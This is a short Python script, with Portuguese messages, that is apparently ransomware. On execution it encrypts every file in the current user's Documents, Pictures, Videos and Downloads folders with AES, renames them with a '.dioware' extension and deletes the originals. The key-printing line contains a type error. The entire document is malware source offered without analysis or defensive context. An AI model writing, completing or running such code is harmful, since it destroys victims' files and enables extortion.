import os
import pyaes

def generate_random_iv():
    number = os.urandom(16)
    print("Codigo de desbloqueio: "+number)
    return number

def encrypt_file(file_path, key):
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()
        aes = pyaes.AESModeOfOperationCTR(key)
        crypto_data = aes.encrypt(file_data)
        new_file_name = f"{file_path}.dioware"
        with open(new_file_name, 'wb') as new_file:
            new_file.write(crypto_data)
        os.remove(file_path)

        print(f"Arquivo criptografado com sucesso: {new_file_name}")
    except Exception as e:
        print(f"Erro ao criptografar o arquivo {file_path}: {e}")

def encrypt_user_directories(username):
    directories_to_encrypt = [
        f"C:/Users/{username}/Documents",
        f"C:/Users/{username}/Pictures",
        f"C:/Users/{username}/Videos",
        f"C:/Users/{username}/Downloads"
    ]
    
    key = generate_random_iv()

    for directory in directories_to_encrypt:
        if os.path.exists(directory):
            for root, dirs, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    encrypt_file(file_path, key)
        else:
            print(f"Diretório não encontrado: {directory}")

username = os.getlogin()
encrypt_user_directories(username)
